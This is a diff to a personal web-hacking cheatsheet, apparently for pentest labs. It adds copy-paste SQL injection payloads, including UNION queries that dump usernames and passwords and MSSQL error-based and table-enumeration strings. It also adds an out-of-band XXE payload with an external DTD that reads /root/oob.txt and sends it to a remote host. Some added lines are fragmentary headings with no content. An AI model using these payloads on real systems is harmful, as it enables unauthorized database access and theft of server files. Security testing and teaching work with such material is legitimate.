@@ -5,7 +5,8 @@ This is basically just a web testing cheatsheet for me but if you find my stuff 
 
 ## Quick Jump:
 - [XSS](#xss-copypastas)
-- 
+- [SQLi](#sql-injection-sqli)
+- []
 
 # Cross-Site Scripting (XSS)
 
@@ -131,3 +132,49 @@ fetch("login").then(res => res.text().then(data => {
 ### sqlmap POST parameter
 Copy POST request from Burp Suite into `post.req` file
 `sqlmap -r post.req -p parameter`
+
+SELECT * FROM menu WHERE name = 'Tostadas'
+
+SELECT id, name, description, price FROM menu WHERE name = 'foo'
+
+jim OR id between 1 and 200
+
+Postgresql: '; select * from menu;--
+
+Oracle:
+
+Strings and functions
+
+ALL: %foo') or id between 1 and 200-- %')
+
+## Example SQLi Statements:
+
+MSSQL error discovery: `inStock=1&name=test&sort=id&order=%foo') or id between 1 and 200-- %')`
+
+MSSQL version/error-based: `inStock=1&name=test ') or 1/@@version=LOWER('name&sort=id&order=asc`
+
+MSSQL 2: `inStock=CAST((SELECT+TOP+1+table_name+FROM+(Select+TOP+2+table_name+FROM+app.information_schema.tables+ORDER+BY+table_name)z+ORDER+BY+table_name+DESC)+as+varchar);&name=&sort=id&order=asc`
+
+UNION: `SELECT id, name, description, price FROM menu WHERE id = 0 UNION ALL SELECT id, username, password, 0 from users`
+
+## External XML Entities (XXE)
+
+Fetch `external.dtd`
+
+```xml
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE oob [
+<!ENTITY % base SYSTEM "http://192.168.45.222/external.dtd"> 
+%base;
+%external;
+%exfil;
+]>
+<entity-engine-xml>
+</entity-engine-xml>
+```
+
+`external.dtd`
+```
+<!ENTITY % content SYSTEM "file:///root/oob.txt">
+<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://192.168.45.222/out?%content;'>" >
+```
